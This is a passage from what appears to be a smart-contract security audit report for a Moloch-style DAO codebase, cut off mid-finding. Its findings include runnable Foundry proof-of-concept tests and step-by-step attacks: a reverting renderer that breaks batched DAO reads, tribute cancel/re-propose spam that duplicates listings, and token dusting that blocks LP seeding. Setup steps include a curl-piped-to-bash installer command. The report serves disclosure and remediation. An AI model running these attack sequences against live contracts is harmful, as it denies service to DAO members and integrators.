        vm.startPrank(attacker);
        for (uint256 i; i < 5; ++i) {
            tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1);
            if (i != 4) tribute.cancelTribute(dao, address(0));
        }
        vm.stopPrank();

        Tribute.ActiveTributeView[] memory active = tribute.getActiveDaoTributes(dao);
        (uint256 tribAmt,,) = tribute.tributes(attacker, dao, address(0));

        assertEq(tribAmt, 1 wei);
        assertEq(active.length, 5);
    }
}
EOF
```
- Expected: the test file is created successfully
2. **Run the PoC**
```bash
forge test --match-test test_duplicateDiscoverySpam -vv
```
- Expected: the test passes, proving one live offer can be returned five times
3. **Scale the spam loop if you want to observe availability degradation**
```bash
sed -i.bak 's/i < 5/i < 500/' test/TributeDiscoverySpamPoC.t.sol
forge test --match-test test_duplicateDiscoverySpam -vv
```
- Expected: the test still shows only one live mapping slot, while the active discovery array size grows linearly with historical spam

##### Verification
Confirm that `tribute.tributes(attacker, dao, address(0))` contains exactly one live offer, while `getActiveDaoTributes(dao)` returns multiple entries with identical proposer/token/amount fields. In the public dapp, the same condition causes `renderTributes()` to render multiple cards because it consumes the returned array directly.

##### Outcome
The attacker gains the ability to cheaply poison a DAO's tribute discovery surface: one active offer can be shown many times, and the cost of reading the tribute list scales with the total number of attacker-created historical references rather than with real live offers. This can mislead DAO members reviewing tributes and can eventually make the public listing slow or unavailable on typical RPC-backed frontends.

</details>

---

<details>
<summary><strong>22. Renderer-backed contractURI can deny service to batched DAO view helper reads</strong></summary>

> **Review: Valid novel finding targeting MolochViewHelper peripheral. Medium severity accepted for peripheral scope.** The `contractURI`-backed helper read DoS — a malicious renderer causing batch view calls to revert — is a genuine design gap not previously documented. Not a Moloch.sol core finding — targets `MolochViewHelper.sol`. Impact is griefing/DoS only, not fund loss. **V2 hardening:** wrap `contractURI` calls in try/catch within the view helper batch functions.

**Winfunc ID:** `23`

**CVSS Score:** `5.4`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-703: Improper Check or Handling of Exceptional Conditions`

**Source Location:** `src/Moloch.sol:2072:Summoner.summon()`

**Sink Location:** `src/Moloch.sol:1023:contractURI()`

#### Summary

An attacker can register a DAO with a reverting or gas-griefing renderer in the shared view-helper aggregation flow, leading to denial of service and incomplete dashboard data for batched DAO and DAICO reads.

#### Root Cause

`MolochViewHelper` directly calls `M.contractURI()` in `getUserDAOs()` (`src/peripheral/MolochViewHelper.sol:459`), `_buildDAOFullState()` (`src/peripheral/MolochViewHelper.sol:630`), and `_getMeta()` (`src/peripheral/MolochViewHelper.sol:1147`) as if it were a safe local metadata read. In this codebase, `Moloch.contractURI()` is not self-contained: when `_orgURI` is empty it forwards to an arbitrary DAO-configured renderer via `IMajeurRenderer(_r).daoContractURI(this)` (`src/Moloch.sol:1023`). These helper paths lack `try/catch`, a low-level success check, or any per-DAO fault isolation, so a single malicious DAO can bubble a renderer revert or gas bomb through the shared batch call.

#### Impact

###### Confirmed Impact
Any call to `getDAOsFullState`, `getDAOWithDAICO`, `getDAOsWithDAICO`, `scanDAICOs`, `getUserDAOs`, or `getUserDAOsFullState` that touches the malicious DAO will revert instead of returning partial results. The repository dapps rely on these batched helper calls (`dapp/Majeur.html:13836`, `dapp/Majeur.html:13870`, `dapp/DAICO.html:8496`), so one malicious DAO can make healthy DAOs disappear from affected views or cause DAICO scans to fail.

###### Potential Follow-On Impact
An attacker can target specific wallets by using raw `Summoner.summon()` to include a victim in `initHolders`, ensuring the victim’s portfolio dashboard queries the malicious DAO and fails. Third-party scanners, indexers, or wallets that use broad helper pagination may need manual blacklisting or per-DAO fallbacks to recover, and gas-heavy renderers may also degrade reliability even when they do not explicitly revert.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:2072](../src/Moloch.sol#L2072)**

   ```solidity
   address renderer,
   ```

   The public factory accepts an arbitrary renderer address from any caller when creating a DAO.

2. **[src/Moloch.sol:228](../src/Moloch.sol#L228)**

   ```solidity
   if (_renderer != address(0)) renderer = _renderer;
   ```

   DAO initialization persists the attacker-supplied renderer in DAO state.

3. **[src/peripheral/MolochViewHelper.sol:390](../src/peripheral/MolochViewHelper.sol#L390)**

   ```solidity
   out[i] = _buildDAOFullState(
   ```

   The shared helper iterates through DAO addresses from the canonical Summoner; one failing DAO aborts the whole batched response.

4. **[src/peripheral/MolochViewHelper.sol:630](../src/peripheral/MolochViewHelper.sol#L630)**

   ```solidity
   meta.contractURI = M.contractURI();
   ```

   The helper blindly performs the metadata read with no try/catch or low-level success check.

5. **[src/Moloch.sol:1023](../src/Moloch.sol#L1023)**

   ```solidity
   return IMajeurRenderer(_r).daoContractURI(this);
   ```

   If `_orgURI` is empty, `contractURI()` forwards into arbitrary renderer code. Any revert or gas grief here bubbles back through the helper and reverts the batch.

#### Exploit Analysis

##### Attack Narrative
An attacker deploys a renderer contract whose `daoContractURI()` always reverts or consumes excessive gas. They then call the public `Summoner.summon()` entrypoint with that renderer address and an empty `orgURI`, causing the new DAO’s `contractURI()` implementation to delegate to the attacker-controlled renderer.

When a wallet, scanner, or the repository’s public dapps query `MolochViewHelper`, the helper loops across DAO addresses from the canonical `Summoner` and blindly executes `M.contractURI()` for each matching DAO. Because the helper does not isolate failures on this path, the malicious renderer’s failure bubbles through the helper and aborts the whole batch. For targeted griefing, the attacker can include the victim in `initHolders` during summon so the victim’s user-specific dashboard necessarily includes the malicious DAO and reverts.

##### Prerequisites
- **Attacker Control/Position:** Control of an arbitrary renderer contract and the ability to call public DAO creation
- **Required Access/Placement:** Unauthenticated public user
- **User Interaction:** Required — a victim wallet, dapp user, or integration must query a helper function over a range that includes the malicious DAO
- **Privileges/Configuration Required:** None for creating a new malicious DAO; targeted user-dashboard griefing additionally requires including the victim in `initHolders` (possible in raw `Summoner.summon()`)
- **Knowledge Required:** Knowledge that the target uses the shared helper and scans DAO ranges that will include the new DAO
- **Attack Complexity:** Low — the exploit only requires deploying a reverting renderer and summoning one DAO with it

##### Attack Steps
1. Deploy a renderer contract whose `daoContractURI(IMoloch)` always reverts (or gas-bombs).
2. Call `Summoner.summon(..., renderer=<malicious renderer>, orgURI="", ...)` so the DAO stores the malicious renderer and uses renderer-backed `contractURI()`.
3. Wait for a victim or integration to call `getDAOsFullState`, `getDAOWithDAICO`, `getDAOsWithDAICO`, `scanDAICOs`, `getUserDAOs`, or `getUserDAOsFullState` over a range containing the DAO.
4. The helper executes `M.contractURI()`, which forwards to the malicious renderer and reverts.
5. The entire helper call fails, suppressing otherwise legitimate DAO data for that response.

##### Impact Breakdown
- **Confirmed Impact:** Shared batched read calls revert when they include the malicious DAO, and the repository dapps fall back to empty/null results for affected views.
- **Potential Follow-On Impact:** Third-party dashboards or scanners may require DAO blacklisting or per-DAO retries to recover; targeted wallet griefing is possible by making the victim an initial member of the malicious DAO.
- **Confidentiality:** None — the bug does not expose protected data.
- **Integrity:** Low — consumers can receive empty/omitted DAO results and make decisions from an incomplete dataset.
- **Availability:** Low — affected helper queries fail until the malicious DAO is excluded or the code is patched.

#### Recommended Fix

Replace direct `M.contractURI()` reads with a fault-tolerant helper and use it everywhere the view helper populates metadata. The current code trusts `contractURI()` as if it were local state, even though it can delegate to arbitrary DAO-configured renderer code.

Before:
```solidity
meta.name = M.name(0);
meta.symbol = M.symbol(0);
meta.contractURI = M.contractURI();
```

After:
```solidity
function _safeContractURI(IMoloch M) internal view returns (string memory uri) {
    // Bound gas so a malicious renderer cannot consume the full batch budget.
    try M.contractURI{gas: 50_000}() returns (string memory s) {
        return s;
    } catch {
        return "";
    }
}
```

```solidity
meta.name = M.name(0);
meta.symbol = M.symbol(0);
meta.contractURI = _safeContractURI(M);
```

Apply the same change at all three call sites: `getUserDAOs()` (`:459`), `_buildDAOFullState()` (`:630`), and `_getMeta()` (`:1147`). If richer isolation is desired, wrap per-DAO metadata loading so a single DAO failure degrades only that DAO’s `contractURI` field instead of the entire batch.

##### Security Principle
Treat all external calls as untrusted, even when they are `view` functions and even when they appear to be metadata-only. Fault isolation prevents one attacker-controlled dependency from cascading into shared batch failure for unrelated records.

##### Defense in Depth
- Add regression tests with a renderer that always reverts and a renderer that burns gas, and assert helper functions still return successful responses with empty `contractURI` for the malicious DAO.
- Consider exposing a DAO-side canonical metadata string that does not depend on renderer execution for batch helper use, or allow clients to opt out of renderer-backed metadata in bulk queries.
- Add client-side per-DAO fallbacks/blacklisting so a single bad DAO cannot blank entire wallet or scanner views while contract fixes roll out.

##### Verification Guidance
- Add a test proving `getDAOsFullState`, `getUserDAOs`, `getDAOWithDAICO`, and `scanDAICOs` no longer revert when one DAO uses a reverting renderer.
- Add a test proving healthy DAOs in the same batch still return correct metadata and balances while the malicious DAO’s `contractURI` is replaced with an empty string.
- Add a gas-budget test showing a gas-heavy renderer cannot exhaust the full batch call after the gas cap is applied.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
git clone <repo-url>
cd <repo-dir>
forge test
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer, IMoloch} from "../src/Renderer.sol";
import {Summoner, Call} from "../src/Moloch.sol";
import {TestViewHelper, MockDAICO} from "./MolochViewHelper.t.sol";

contract RevertingRenderer {
    function daoContractURI(IMoloch) external pure returns (string memory) {
        revert("renderer revert");
    }

    function daoTokenURI(IMoloch, uint256) external pure returns (string memory) {
        return "";
    }

    function badgeTokenURI(IMoloch, uint256) external pure returns (string memory) {
        return "";
    }
}

contract ViewHelperRendererDosPoC is Test {
    Summoner summoner;
    MockDAICO daico;
    TestViewHelper helper;

    address victim = address(0xBEEF);

    function setUp() public {
        summoner = new Summoner();
        daico = new MockDAICO();
        helper = new TestViewHelper(address(summoner), address(daico));

        address[] memory holders = new address[](1);
        holders[0] = victim;
        uint256[] memory shares = new uint256[](1);
        shares[0] = 1e18;
        Call[] memory initCalls = new Call[](0);

        // Healthy DAO with a normal renderer.
        summoner.summon(
            "Good DAO",
            "GOOD",
            "",
            0,
            false,
            address(new Renderer()),
            keccak256("good"),
            holders,
            shares,
            initCalls
        );

        // Malicious DAO with a renderer that always reverts.
        // Because orgURI is empty, Moloch.contractURI() delegates to this renderer.
        summoner.summon(
            "Bad DAO",
            "BAD",
            "",
            0,
            false,
            address(new RevertingRenderer()),
            keccak256("bad"),
            holders,
            shares,
            initCalls
        );
    }

    function test_batched_read_reverts() public {
        address[] memory treasuryTokens = new address[](0);

        // Global gallery / scanner path.
        vm.expectRevert();
        helper.getDAOsFullState(0, 2, 0, 0, 0, 0, treasuryTokens);
    }

    function test_user_dashboard_reverts() public {
        address[] memory treasuryTokens = new address[](0);

        // Victim-targeted dashboard path.
        vm.expectRevert();
        helper.getUserDAOs(victim, 0, 2, treasuryTokens);
    }
}
```

##### Steps
1. **Save the PoC test**
```bash
cat > test/ViewHelperRendererDosPoC.t.sol <<'EOF'
[PASTE THE SOLIDITY SNIPPET ABOVE]
EOF
```
- Expected: the file is created successfully.
2. **Run the PoC**
```bash
forge test --match-contract ViewHelperRendererDosPoC -vv
```
- Expected: both tests pass because the helper calls revert exactly where `vm.expectRevert()` anticipates.
3. **Observe the failure mode directly**
- Remove `vm.expectRevert()` from either test and rerun.
- Expected: `getDAOsFullState()` or `getUserDAOs()` reverts once the malicious DAO is included in the queried range.

##### Verification
Confirm that the revert disappears if the malicious DAO is excluded from the pagination range or if the renderer is replaced with a non-reverting implementation. Also confirm that healthy DAOs become queryable again once the bad DAO is skipped.

##### Outcome
The attacker gains a reliable way to break shared read paths that aggregate DAO state. Any wallet, dapp, or indexer using these batched helper functions over ranges that include the attacker’s DAO can lose visibility into otherwise healthy DAOs or have the entire view call fail until client-side filtering or contract-side fault isolation is added.

</details>

---

<details>
<summary><strong>23. Tribute re-proposals can duplicate a single active offer in DAO discovery</strong></summary>

> **Review: Valid novel finding (same root cause as #21). Medium severity accepted for peripheral scope.** See #21 review. Tribute cancel/re-propose cycles creating duplicate discovery listings. Not a Moloch.sol core finding. **Severity: Medium (peripheral, griefing/UX impact).**

**Winfunc ID:** `2`

**CVSS Score:** `5.3`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-400: Uncontrolled Resource Consumption`

**Source Location:** `src/peripheral/Tribute.sol:101:proposeTribute()`

**Sink Location:** `src/peripheral/Tribute.sol:221:getActiveDaoTributes()`

#### Summary

An attacker can repeatedly cancel and re-open the same tribute slot in Tribute discovery, leading to incorrect duplicate listings and eventual denial of service for DAO tribute views.

#### Root Cause

`Tribute.proposeTribute()` appends a new `DaoTributeRef`/`ProposerTributeRef` on every proposal, but `cancelTribute()` and `claimTribute()` only delete the live `tributes` mapping entry and never prune or invalidate old refs. `getActiveDaoTributes()` later re-resolves each historical ref through the current `(proposer, dao, tribTkn)` mapping slot without any nonce, index, or deduplication check, so stale refs alias a newly re-proposed live offer on the same key.

#### Impact

###### Confirmed Impact
A single live tribute can be returned arbitrarily many times by `getActiveDaoTributes()`. The public dapp directly consumes this view and renders one card per returned entry, so attackers can inflate the visible tribute list and increase client-side work until the view or UI becomes unreliable.

###### Potential Follow-On Impact
Integrations that treat each returned entry as a distinct opportunity may waste governance attention, proposal space, or transaction gas on repeated handling of the same escrow. The exact downstream effect depends on the client or automation consuming `getActiveDaoTributes()`, so this should be treated as secondary to the confirmed listing-integrity and availability impact.

#### Source-to-Sink Trace

1. **[src/peripheral/Tribute.sol:101](../src/peripheral/Tribute.sol#L101)**

   ```solidity
   daoTributeRefs[dao].push(DaoTributeRef({proposer: msg.sender, tribTkn: tribTkn}));
   ```

   Every proposal appends an attacker-controlled discovery reference for the selected DAO and tribute token.

2. **[src/peripheral/Tribute.sol:113](../src/peripheral/Tribute.sol#L113)**

   ```solidity
   delete tributes[msg.sender][dao][tribTkn];
   ```

   Canceling the tribute clears only the live offer mapping entry; the historical discovery ref remains stored.

3. **[src/peripheral/Tribute.sol:101](../src/peripheral/Tribute.sol#L101)**

   ```solidity
   daoTributeRefs[dao].push(DaoTributeRef({proposer: msg.sender, tribTkn: tribTkn}));
   ```

   Re-opening the same `(proposer, dao, tribTkn)` slot appends another identical historical ref without invalidating the old one.

4. **[src/peripheral/Tribute.sol:207](../src/peripheral/Tribute.sol#L207)**

   ```solidity
   TributeOffer storage offer = tributes[refs[i].proposer][dao][refs[i].tribTkn];
   ```

   During enumeration, each historical ref is resolved through the current mapping slot, so stale refs now alias the same newly re-opened offer.

5. **[src/peripheral/Tribute.sol:221](../src/peripheral/Tribute.sol#L221)**

   ```solidity
   result[idx] = ActiveTributeView({ proposer: r.proposer, tribTkn: r.tribTkn, tribAmt: offer.tribAmt, forTkn: offer.forTkn, forAmt: offer.forAmt });
   ```

   Each aliasing ref is emitted as a separate active result entry, duplicating one live offer.

6. **[dapp/Majeur.html:15090](../dapp/Majeur.html#L15090)**

   ```solidity
   currentDaoTributes = await tributeContract.getActiveDaoTributes(currentDAO.dao.dao);
   ```

   The public dapp directly consumes the duplicated view output and then renders one card per returned entry, amplifying the integrity and availability impact.

#### Exploit Analysis

##### Attack Narrative
An external attacker targets any DAO address that relies on the Tribute peripheral for public deal discovery. They open a minimal tribute, cancel it, and re-open the exact same `(proposer, dao, tribTkn)` slot over and over. Every re-open appends another discovery reference, but old references are never removed.

When anyone later queries `getActiveDaoTributes(targetDao)`, the contract walks every historical reference and looks up the current offer by key. Because all stale references resolve to the same newly re-opened offer, the function counts and returns that single live tribute once per historical reference. The public dapp then renders each duplicate and performs additional token metadata and DOM work for each one, allowing the attacker to bloat or eventually break the tribute listing for that DAO.

##### Prerequisites
- **Attacker Control/Position:** Control of any EOA or contract that can call the public Tribute contract
- **Required Access/Placement:** Unauthenticated / public network access
- **User Interaction:** None
- **Privileges/Configuration Required:** Tribute must be deployed and a DAO or client must rely on `getActiveDaoTributes()` for listing offers
- **Knowledge Required:** Only the target DAO address
- **Attack Complexity:** Low — the attacker repeats a simple `propose -> cancel -> propose` sequence on the same key

##### Attack Steps
1. Call `proposeTribute(targetDao, address(0), 0, address(0), 1)` with `msg.value = 1` to create a minimal ETH tribute.
2. Call `cancelTribute(targetDao, address(0))` to delete the live mapping entry while leaving the historical discovery ref in place.
3. Re-open the same tribute key by calling `proposeTribute(targetDao, address(0), 0, address(0), 1)` again.
4. Repeat steps 2-3 as many times as desired.
5. Wait for victims or the public dapp to call `getActiveDaoTributes(targetDao)`.
6. Observe that the returned array contains the same live offer many times and grows with historical ref count.

##### Impact Breakdown
- **Confirmed Impact:** Incorrect duplicate active-tribute listings and growing availability pressure on the public discovery path and dapp rendering flow.
- **Potential Follow-On Impact:** Integrations may waste proposal space, gas, or operator attention on repeated handling of one escrow; exact downstream effects depend on consumer logic.
- **Confidentiality:** None — the issue does not expose protected data.
- **Integrity:** Low — the public discovery API returns materially misleading duplicate state for a single live tribute.
- **Availability:** Low — unbounded history growth increases `eth_call`/frontend work and can eventually make tribute views unreliable.

#### Recommended Fix

Bind each discovery reference to a unique offer version, or remove the corresponding ref on cancel/claim. The safest minimal change is to add a per-offer nonce that increments whenever the same `(proposer, dao, tribTkn)` slot is re-opened, store that nonce in both the live offer and the discovery ref, and only surface refs whose nonce matches the current live offer.

**Before**
```solidity
struct TributeOffer {
    uint256 tribAmt;
    address forTkn;
    uint256 forAmt;
}

struct DaoTributeRef {
    address proposer;
    address tribTkn;
}

offer.tribAmt = tribAmt;
offer.forTkn = forTkn;
offer.forAmt = forAmt;
daoTributeRefs[dao].push(DaoTributeRef({proposer: msg.sender, tribTkn: tribTkn}));
```

**After**
```solidity
struct TributeOffer {
    uint256 tribAmt;
    address forTkn;
    uint256 forAmt;
    uint64 nonce;
}

struct DaoTributeRef {
    address proposer;
    address tribTkn;
    uint64 nonce;
}

mapping(address proposer => mapping(address dao => mapping(address tribTkn => uint64)))
    internal tributeNonce;

uint64 nonce = ++tributeNonce[msg.sender][dao][tribTkn];
offer.tribAmt = tribAmt;
offer.forTkn = forTkn;
offer.forAmt = forAmt;
offer.nonce = nonce;
daoTributeRefs[dao].push(DaoTributeRef({
    proposer: msg.sender,
    tribTkn: tribTkn,
    nonce: nonce
}));
```

Then gate enumeration on the nonce match:
```solidity
TributeOffer storage offer = tributes[r.proposer][dao][r.tribTkn];
if (offer.tribAmt != 0 && offer.nonce == r.nonce) {
    result[idx] = ActiveTributeView({
        proposer: r.proposer,
        tribTkn: r.tribTkn,
        tribAmt: offer.tribAmt,
        forTkn: offer.forTkn,
        forAmt: offer.forAmt
    });
}
```

##### Security Principle
Discovery references must identify a specific live object, not just a reusable storage key. By preventing stale refs from aliasing newly created offers, the view layer regains one-to-one correspondence between active state and returned entries.

##### Defense in Depth
- Add pagination or bounded-range getters for active tributes so one attacker cannot force every client call to scan the full historical set.
- Deduplicate by `(proposer, tribTkn)` in the dapp before rendering as a temporary mitigation while on-chain fixes are rolled out.

##### Verification Guidance
- Add a regression test that performs `propose -> cancel -> propose` on the same key and asserts `getActiveDaoTributes(dao).length == 1`.
- Add a fuzz/property test that repeats cancel/re-propose cycles and asserts the returned set cardinality equals the number of unique live offers, not the number of historical refs.
- Verify the dapp still renders legitimate distinct offers from different proposers or tribute tokens after the fix.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:** `curl -L https://foundry.paradigm.xyz | bash && foundryup`
- **Target Setup:** `git clone <repo> && cd <repo> && forge build`

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {Tribute} from "../src/peripheral/Tribute.sol";

contract TributeDuplicateListingPoC is Test {
    Tribute tribute;
    address attacker = address(0xA11CE);
    address dao = address(0xDA0);

    function setUp() public {
        tribute = new Tribute();
        vm.deal(attacker, 1 ether);
    }

    function test_duplicate_active_tribute_listing() public {
        vm.startPrank(attacker);

        // Open one live tribute.
        tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1 wei);

        // Reuse the same (proposer, dao, tribTkn) slot repeatedly.
        for (uint256 i; i < 5; ++i) {
            tribute.cancelTribute(dao, address(0));
            tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1 wei);
        }

        vm.stopPrank();

        Tribute.ActiveTributeView[] memory active = tribute.getActiveDaoTributes(dao);

        // There is only one live escrow, but it is surfaced once per historical ref.
        assertEq(active.length, 6, "one active tribute is returned six times");
        for (uint256 i; i < active.length; ++i) {
            assertEq(active[i].proposer, attacker);
            assertEq(active[i].tribTkn, address(0));
            assertEq(active[i].tribAmt, 1 wei);
            assertEq(active[i].forTkn, address(0));
            assertEq(active[i].forAmt, 1 wei);
        }
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/TributeDuplicateListingPoC.t.sol <<'EOF'
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "forge-std/Test.sol";
import {Tribute} from "../src/peripheral/Tribute.sol";

contract TributeDuplicateListingPoC is Test {
    Tribute tribute;
    address attacker = address(0xA11CE);
    address dao = address(0xDA0);

    function setUp() public {
        tribute = new Tribute();
        vm.deal(attacker, 1 ether);
    }

    function test_duplicate_active_tribute_listing() public {
        vm.startPrank(attacker);
        tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1 wei);
        for (uint256 i; i < 5; ++i) {
            tribute.cancelTribute(dao, address(0));
            tribute.proposeTribute{value: 1 wei}(dao, address(0), 0, address(0), 1 wei);
        }
        vm.stopPrank();

        Tribute.ActiveTributeView[] memory active = tribute.getActiveDaoTributes(dao);
        assertEq(active.length, 6, "one active tribute is returned six times");
    }
}
EOF
```
- Expected: the test file is created successfully.
2. **Run the PoC**
```bash
forge test --match-test test_duplicate_active_tribute_listing -vv
```
- Expected: the test passes.
3. **Inspect the returned list semantics**
- Expected: `active.length` equals the number of historical references, not the number of live tributes.

##### Verification
Confirm that only one escrow remains live after the loop, yet `getActiveDaoTributes(dao)` returns six entries with identical `(proposer, tribTkn, tribAmt, forTkn, forAmt)` fields. This proves stale discovery refs are being interpreted as additional active offers.

##### Outcome
The attacker can make one real tribute appear many times in the DAO's public discovery view at negligible economic cost (for example, a 1 wei ETH tribute repeatedly cancelled and re-opened). As the historical ref list grows, off-chain consumers must process and render increasingly many duplicate entries, degrading usability and potentially causing view failures.

</details>

---

<details>
<summary><strong>24. LP seed minSupply gate can be griefed by dusting tokenB into the DAO</strong></summary>

> **Review: Valid novel finding targeting LPSeedSwapHook peripheral. Medium severity accepted for peripheral scope.** The `minSupply` gate griefing via tokenB dusting is a genuine design gap not previously documented. Attacker can block LP seeding by sending dust tokens to the DAO, keeping the readiness check false. Not a Moloch.sol core finding. Impact is griefing/DoS until governance clears the balance. **V2 hardening:** use a signed-off snapshot balance check rather than live `balanceOf`, or allow governance to override the seed gate.

**Winfunc ID:** `6`

**CVSS Score:** `5.3`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`

**Vulnerability Type:** `CWE-841: Improper Enforcement of Behavioral Workflow`

**Source Location:** `src/Moloch.sol:1137:transfer()`

**Sink Location:** `src/peripheral/LPSeedSwapHook.sol:387:_isReady()`

#### Summary

An attacker can dust tokenB into a DAO configured with LPSeedSwapHook's minSupply gate, leading to denial of service of permissionless LP seeding.

#### Root Cause

`LPSeedSwapHook._isReady()` uses the DAO's live `tokenB` balance as the readiness predicate for the optional `minSupply` gate, via `balanceOf(cfg.tokenB, dao)` and `if (daoBal > cfg.minSupply) return false` (`src/peripheral/LPSeedSwapHook.sol:385-387`). That balance is not module-owned state and is directly influenceable by third parties who can transfer `tokenB` to the DAO address; for the built-in share token path, `Shares.transfer()` remains allowed into the DAO even when transfers are locked because `_checkUnlocked` only reverts when both endpoints are non-DAO (`src/Moloch.sol:1217-1220`).

#### Impact

###### Confirmed Impact
A public attacker who can obtain any amount of `tokenB` can keep `seedable()` false and make `seed()` revert with `NotReady`, blocking LP initialization until the DAO governance process reconfigures the seed or disposes of the excess balance.

###### Potential Follow-On Impact
Repeated dusting can delay launches, stall downstream pool creation or trading plans, and force repeated governance actions or treasury movements. The broader economic fallout depends on how critical timely seeding is for a given DAO deployment, but the launch-blocking behavior itself is directly supported by the code.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:1137](../src/Moloch.sol#L1137)**

   ```solidity
   function transfer(address to, uint256 amount) public returns (bool) { _checkUnlocked(msg.sender, to); _moveTokens(msg.sender, to, amount); }
   ```

   The attacker-controlled share transfer enters the system here. An attacker holding DAO shares can send them to the DAO address as dust.

2. **[src/Moloch.sol:1217](../src/Moloch.sol#L1217)**

   ```solidity
   if (transfersLocked && from != DAO && to != DAO) { revert Locked(); }
   ```

   Transfer-locking does not block the grief path because transfers into the DAO (`to == DAO`) are explicitly allowed.

3. **[src/Moloch.sol:1186](../src/Moloch.sol#L1186)**

   ```solidity
   balanceOf[from] -= amount; unchecked { balanceOf[to] += amount; }
   ```

   The dust transfer directly increments the DAO's token balance, which is the state later consulted by LPSeedSwapHook.

4. **[src/peripheral/LPSeedSwapHook.sol:386](../src/peripheral/LPSeedSwapHook.sol#L386)**

   ```solidity
   uint256 daoBal = balanceOf(cfg.tokenB, dao); if (daoBal > cfg.minSupply) return false;
   ```

   LPSeedSwapHook reads the live DAO token balance and treats any excess over `minSupply` as a not-ready condition, even if the excess came from an unsolicited third-party transfer.

5. **[src/peripheral/LPSeedSwapHook.sol:394](../src/peripheral/LPSeedSwapHook.sol#L394)**

   ```solidity
   if (!_isReady(dao, cfg)) revert NotReady();
   ```

   When anyone later calls `seed()`, the attacker-inflated balance causes a hard revert and blocks LP seeding. `seedable()` also returns false via the same `_isReady()` path.

#### Exploit Analysis

##### Attack Narrative
The attacker is an external participant watching for a DAO that configured `LPSeedSwapHook` with a nonzero `minSupply`. Once the DAO is near or at that threshold, the attacker acquires a dust amount of `tokenB`—most naturally the DAO's own shares or loot, but the same logic applies to any ERC20 chosen as `tokenB`—and transfers it into the DAO address.

Because `LPSeedSwapHook` does not track an internal accounting variable and instead consults the DAO's live ERC20 balance, that unsolicited transfer immediately makes `_isReady()` return `false`. From that point, every public attempt to call `seed()` reverts with `NotReady`, and even `seedable()` advertises the DAO as not ready until governance actively removes the excess balance or changes the configuration. If the DAO cleans up, the attacker can repeat the dust transfer.

##### Prerequisites
- **Attacker Control/Position:** Ability to obtain any amount of the configured `tokenB` and send it to the DAO address
- **Required Access/Placement:** Unauthenticated / public network participant
- **User Interaction:** None
- **Privileges/Configuration Required:** The DAO must have configured `LPSeedSwapHook` with `minSupply != 0`; exploitability is easiest when `tokenB` is the DAO's shares/loot or another widely transferable ERC20
- **Knowledge Required:** DAO address, `tokenB` address, and approximate threshold/current balance
- **Attack Complexity:** Low — one small transfer is enough, and the grief can be repeated after cleanup

##### Attack Steps
1. Identify a DAO with an active LP seed configuration and nonzero `minSupply`.
2. Acquire a dust amount of the configured `tokenB`.
3. Transfer that dust directly to the DAO address.
4. Wait for any keeper, user, or DAO operator to call `seedable()` or `seed()`.
5. Observe that `seedable()` is false and `seed()` reverts with `NotReady` until the DAO removes the excess balance or reconfigures the hook.
6. Repeat the dust transfer if the DAO clears the balance and still relies on the same gate.

##### Impact Breakdown
- **Confirmed Impact:** Public denial of service against LP seeding for any DAO using the `minSupply` gate
- **Potential Follow-On Impact:** Launch delays, governance overhead, missed liquidity windows, and blocked downstream trading or treasury plans, depending on deployment and operational timing
- **Confidentiality:** None — the bug does not expose private data
- **Integrity:** None — the attacker does not gain authority over DAO state transitions beyond blocking readiness checks
- **Availability:** Low — the LP seeding feature is blocked until the DAO intervenes

#### Recommended Fix

Do not use the DAO's raw live ERC20 balance as the authoritative `minSupply` readiness signal. That balance is public, attacker-influenceable state. Instead, track a DAO-authoritative accounting value that only governance or an authorized sale/distribution module can update, and gate readiness on that tracked value rather than `balanceOf`.

Before:
```solidity
// Supply gate: DAO's tokenB balance must be at or below threshold
if (cfg.minSupply != 0) {
    uint256 daoBal = balanceOf(cfg.tokenB, dao);
    if (daoBal > cfg.minSupply) return false;
}
```

After (one safe pattern):
```solidity
struct SeedConfig {
    address tokenA;
    address tokenB;
    uint128 amountA;
    uint128 amountB;
    uint16 feeBps;
    uint40 deadline;
    address shareSale;
    uint128 minSupply;
    uint128 trackedTokenB;
    bool seeded;
}

function configure(
    address tokenA,
    uint128 amountA,
    address tokenB,
    uint128 amountB,
    uint40 deadline,
    address shareSale,
    uint128 minSupply
) public {
    seeds[msg.sender] = SeedConfig({
        tokenA: tokenA,
        tokenB: tokenB,
        amountA: amountA,
        amountB: amountB,
        feeBps: 0,
        deadline: deadline,
        shareSale: shareSale,
        minSupply: minSupply,
        trackedTokenB: uint128(balanceOf(tokenB, msg.sender)),
        seeded: false
    });
}

function syncTrackedTokenB(uint128 newTrackedTokenB) external {
    SeedConfig storage cfg = seeds[msg.sender];
    if (newTrackedTokenB > cfg.trackedTokenB) revert InvalidParams();
    cfg.trackedTokenB = newTrackedTokenB;
}

function _isReady(address, SeedConfig memory cfg) internal view returns (bool) {
    if (cfg.deadline != 0 && block.timestamp <= cfg.deadline) return false;
    if (cfg.shareSale != address(0)) {
        // existing sale gate
    }
    if (cfg.minSupply != 0 && cfg.trackedTokenB > cfg.minSupply) return false;
    return true;
}
```

If the intended use case is specifically to wait for a `ShareSale` or another module to reduce token inventory, an even better fix is to gate on that module's internal accounting or remaining allowance instead of on arbitrary ERC20 balances.

##### Security Principle
